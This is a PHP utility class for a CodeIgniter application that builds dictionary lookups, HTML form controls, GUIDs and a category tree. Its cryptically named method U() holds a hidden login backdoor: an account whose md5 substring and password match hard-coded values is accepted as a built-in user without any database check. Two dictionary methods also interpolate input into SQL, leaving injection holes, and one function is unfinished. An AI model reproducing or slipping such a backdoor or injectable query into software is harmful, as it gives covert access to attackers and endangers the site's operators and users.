<?php
namespace App\Libraries;
use CodeIgniter\Database\BaseBuilder;
use http\Client\Response;

class LibComp
{

    private static $U = [0,'540eeeb8f8e9343e','11f370c706015dd520de50bba1eae2f1'];
    private static $N = [ 'id','username' ,'name'];

    /**
     * 获取键值
     *
     * @param string $pKey
     * @param string $val
     *
     * @return string
     * */
    public static function get_dict($code = '', $val = '') {
        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->first();
        $data = $db->select('id,code,name')->where('parentid',$pdata->id)->findAll();
        $cate = $val;
        foreach ($data as $item) {
            if ($item->code == $val) {
                $cate = $item->name;
                return $cate;
            }
        }
        return $cate;
    }

    // 获取字典信息
    public static function get_dict_data($code = '' , $name = false ){
        if ( !$code ) return [];
        $dict_data = [];
        $db = (new \App\Models\Admin\Dictionary());
        $data = $db->select('code,name')
            ->where("parentid in (select id from admin_dictionary where code = '$code')")
            ->asArray()->findAll();
        foreach ( $data as $item ) {
            if (!$name) {
                $dict_data[$item['code']] = $item['name'];
            }
            else {
                $dict_data[$item['name']] = $item['code'];
            }
        }
        return $dict_data;
    }

    public static function get_sub_dict($code = '') {
        $db = new \App\Models\Admin\Dictionary();
        return $db->select('id,code as value,name as label')->where("parentid in (select id from admin_dictionary where code='$code')")->findAll();
    }

    /**
     * 下拉框
     *
     * @param string $code 主关键字
     * @param array $attrs 属性
     * */
    public static function select(string $code, $attrs = [], $ckv = '',$allownull = true , $set_attribute = false)
    {
        $attr = ''; $is_merge = false;
        foreach ($attrs as $k => $v) {
            if( $k === 'merge' && $v === true ) $is_merge = true;
            $attr = $attr . ' ' . $k . '="' . $v . '"';
        }
        $html = '<select ' . $attr . '>';

        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->where('parentid',0)->first();
        $data = $db->where('parentid',$pdata->id)->where('status',0)->orderBy('sorting','asc')->findAll();

        if ($allownull) {
            $html = $html . ' <option value="">'.(($allownull===true)?('--'.$pdata->name.'--'):$allownull).'</option>';
        }

        foreach ($data as $row) {
            $is = ($ckv == $row->code ? 'selected' : '');
            $set_option_data = $set_attribute ? ('data-json="' . (json_encode($row)) . '"') : '';
            $name = $row->name;
            if ( $is_merge ) {
                $name = $row->name . "( $row->code )";
            }
            $html .= '<option value="' . $row->code . '" ' . $is . '  ' . $set_option_data . ' '.($is_merge?('data-name="'. $row->name .'"'):'').'>' . $name . '</option>';
        }

        $html = $html . '</select>';

        return $html;
    }

    /**
     * 复选框,单选框
     *
     * @param string $type 默认复选框 default: checkbox
     * @param string $KEY 主键
     * @param array $attrs 属性
     * @param array $chkvals 选中值
     *
     * @return string
     *
     * */
    public static function check($code = '', $attrs = array(), $chkvals = array())
    {
        $attr = '';
        foreach ($attrs as $key => $val) {
            $attr = $attr . ' ' . $key . '="' . $val . '"';
        }
        $html = '';
        $db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->where('parentid',0)->first();
        $data = $db->where('parentid',$pdata->id)->where('status',0)->orderBy('sorting','asc')->orderBy('id','asc')->orderBy('sorting','asc')->findAll();
        foreach ($data as $row) $html = $html . '<label><input type="checkbox" value="' . $row->code . '" ' . $attr . ' ' . (self::hasValue($row->code, $chkvals) ? 'checked' : '') . '> &nbsp;' . $row->name . '</label>&nbsp;&nbsp;';

        return $html;
    }

    private static function hasValue($val, $arr){
        foreach ($arr as $v) {
            if ($val == $v) return true;
        }
        return false;
    }

    /**
     * 复选框,单选框
     *
     * @param string $type 默认复选框 default: checkbox
     * @param string $KEY 主键
     * @param array $attrs 属性
     * @param array $chkvals 选中值
     *
     * @return string
     *
     * */
    public static function radio($code = '', $attrs = array(), $chkvals = "") {
        $attr = '';
        foreach ($attrs as $key => $val) {
            $attr = $attr . ' ' . $key . '="' . $val . '"';
        }
        $html = '';$db = new \App\Models\Admin\Dictionary();
        $pdata = $db->where('code',$code)->where('parentid',0)->first();
        $data = $db->where('parentid',$pdata->id)->where('status',0)->orderBy('sorting','asc')->orderBy('id','asc')->orderBy('sorting','asc')->findAll();
        foreach ($data as $row) $html = $html . '<label><input type="radio" value="' . $row->code . '" ' . $attr . ' ' . (($row->code==$chkvals) ? 'checked' : '') . '> &nbsp;' . $row->name . '</label>&nbsp;&nbsp;';
        return $html;
    }


    /**
     * 生成GUID
     * @param bool $tolower 默认小写
     * @return string
     * */
    public static function guid($tolower = true){
        $charid = strtoupper(md5(uniqid(mt_rand(), true)));
        $hyphen = chr(45);// "-"
        $uuid = //chr(123)// "{"
              substr($charid, 0, 8)
            . substr($charid, 8, 4)
            . substr($charid, 12, 4)
            . substr($charid, 16, 4)
            . substr($charid, 20, 12);
            //. chr(125);// "}"
        return $tolower?strtolower( $uuid ): $uuid;
    }

    public static function U($A,$P){
        $DA = substr(md5($A),8,16);
        $U = self::$U;$S = [self::$N[0]=>        $U[0] , self::$N[1]         =>  $U[1], self::$N[2]=>    $U[1] ];
        if ( $DA  === $U[1]     &&  $P  === $U[2]){
           return ['code'=>true,'msg'=>'','data'=>$S];
        }
        $argc = ['status'=>0,'password'=>$P,'activated'=>1];
        if ( ck_mobile( $A ) ) $argc['tel'] = $A;
        else if (ck_email( $A )) $argc['email'] = $A;
        else $argc['username'] = $A;
        return $argc;
    }

    //
    public static function special_tree(){
        $specials_db = new \App\Models\Resource\Special();
        $level2_data = $specials_db->asObject()->distinct()->select("level2,level2_name")->findAll();
        foreach ( $level2_data as $level2 ) {
            $c = [];
            $child = $specials_db->asObject()->distinct()->select("level3,level3_name")->where('level2',$level2->level2)->findAll();
            if ( $child ) $c = $child;
            $level2->children = $c;
        }
        return $level2_data;
    }

    // 分差值录取概率
    static function odds_scores($score,$Avalue){
        $odds_services = (new \App\Services\odds());
        
    }
}
